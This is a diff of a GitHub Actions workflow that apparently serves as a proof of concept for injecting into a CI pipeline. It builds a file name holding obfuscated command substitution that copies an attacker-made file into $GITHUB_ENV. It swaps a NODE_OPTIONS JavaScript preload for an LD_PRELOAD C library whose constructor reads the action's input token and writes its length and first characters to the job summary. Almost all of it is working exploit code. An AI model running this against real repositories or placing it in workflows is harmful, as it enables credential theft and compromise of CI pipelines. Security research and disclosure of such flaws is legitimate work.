@@ -17,18 +17,24 @@ jobs:
           mkdir -p content
           cd content
           printf 'BENIGN\n' > summary.txt
-          printf 'NODE_OPTIONS=--require=/tmp/content/content/p.js\n' > env.txt
-          cat > p.js <<'JS'
-          try {
-            const fs = require('fs');
-            const t = process.env.INPUT_TOKEN || process.env.INPUT_GITHUB_TOKEN || '';
-            const line = 'PRELOAD_RAN token_len=' + t.length + ' token_head=' + (t ? t.slice(0,4) : 'NONE') + ' action=' + (process.env.GITHUB_ACTION || '?');
-            try { fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY || '/tmp/summary', line + '\n'); } catch (e) {}
-            console.log(line);
-          } catch (e) { console.log('PRELOAD_ERR ' + e.message); }
-          JS
+          printf 'LD_PRELOAD=/tmp/content/content/libpoc.so\n' > env2.txt
+          cat > libpoc.c <<'C'
+          #include <stdio.h>
+          #include <stdlib.h>
+          #include <string.h>
+          __attribute__((constructor)) static void run(void) {
+            const char *t = getenv("INPUT_TOKEN");
+            if (!t) t = getenv("INPUT_GITHUB_TOKEN");
+            if (!t) { fprintf(stderr, "PRELOAD_NO_INPUT_TOKEN\n"); return; }
+            const char *sum = getenv("GITHUB_STEP_SUMMARY");
+            FILE *f = fopen(sum ? sum : "/tmp/summary", "a");
+            if (f) { fprintf(f, "PRELOAD_TOKEN len=%zu prefix=%.4s\n", strlen(t), t); fclose(f); }
+            fprintf(stderr, "PRELOAD_TOKEN len=%zu prefix=%.4s\n", strlen(t), t);
+          }
+          C
+          gcc -shared -fPIC -o libpoc.so libpoc.c
           cat > /tmp/evilname <<'EOF'
-          $(cp${IFS}${PWD:0:1}tmp${PWD:0:1}content${PWD:0:1}content${PWD:0:1}env.txt${IFS}$GITHUB_ENV&&echo${IFS}summary).txt
+          $(s=$(printf${IFS}%.1s${IFS}$GITHUB_ENV);cp${IFS}$s${s}tmp${s}content${s}content${s}env2.txt${IFS}$GITHUB_ENV&&echo${IFS}summary).txt
           EOF
           touch "$(cat /tmp/evilname)"
           ls -la
